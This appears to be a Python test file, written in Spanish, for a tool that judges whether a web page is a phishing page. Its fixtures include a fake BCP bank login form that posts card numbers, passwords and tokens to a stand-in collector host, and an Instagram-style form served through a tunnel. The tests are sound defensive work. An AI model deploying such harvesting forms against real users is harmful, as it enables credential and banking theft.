"""Pruebas de «¿esta página es segura?» (sin internet: el contenido de la página se simula)."""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from app import navegador  # noqa: E402

FALSA_BCP = """<html><head><title>BCP - Banca por Internet</title></head><body>
<h1>Bienvenido a Banca por Internet BCP</h1>
<form action="https://recolector-datos.xyz/guardar.php" method="post">
<input name="tarjeta" placeholder="Número de tarjeta"><input type="password" name="clave"><input name="token" placeholder="Token">
</form></body></html>"""


def test_pagina_falsa_del_bcp_es_peligro(monkeypatch):
    monkeypatch.setattr(navegador, "_descargar", lambda url: (FALSA_BCP, url))
    r = navegador.revisar("https://bcp-zonasegura.xyz/login")
    assert r["nivel"] == "peligro"
    assert any("BCP" in x for x in r["razones"])


def test_login_en_dominio_oficial_no_se_marca_como_suplantacion(monkeypatch):
    html = FALSA_BCP.replace("https://recolector-datos.xyz/guardar.php", "/login")
    monkeypatch.setattr(navegador, "_descargar", lambda url: (html, url))
    r = navegador.revisar("https://www.viabcp.com/login")
    assert r["nivel"] == "tranquilo" and not any("no está en un dominio oficial" in x for x in r["razones"])


def test_pagina_normal_y_paginas_internas(monkeypatch):
    monkeypatch.setattr(navegador, "_descargar", lambda url: ("<html><title>Recetas</title><p>Arroz con pollo</p></html>", url))
    assert navegador.revisar("https://recetas-peruanas.com/arroz")["nivel"] == "tranquilo"
    assert navegador.revisar("chrome://settings")["nivel"] == "tranquilo"


def test_no_descarga_direcciones_privadas():
    assert navegador._descargar("http://127.0.0.1:8765/") is None
    assert navegador._descargar("http://192.168.1.1/") is None


def test_tunel_de_zphisher_y_marca_internacional(monkeypatch):
    html = ("<html><title>Instagram</title><form method='post' action='login.php'>"
            "<input name='username'><input type='password' name='password'></form></html>")
    monkeypatch.setattr(navegador, "_descargar", lambda url: (html, url))
    r = navegador.revisar("https://acute-easter-categories-portions.trycloudflare.com/")
    assert r["nivel"] == "peligro"
    assert any("túnel" in x for x in r["razones"]) and any("Instagram" in x for x in r["razones"])
    assert navegador.revisar("https://www.instagram.com/accounts/login/")["nivel"] == "tranquilo"
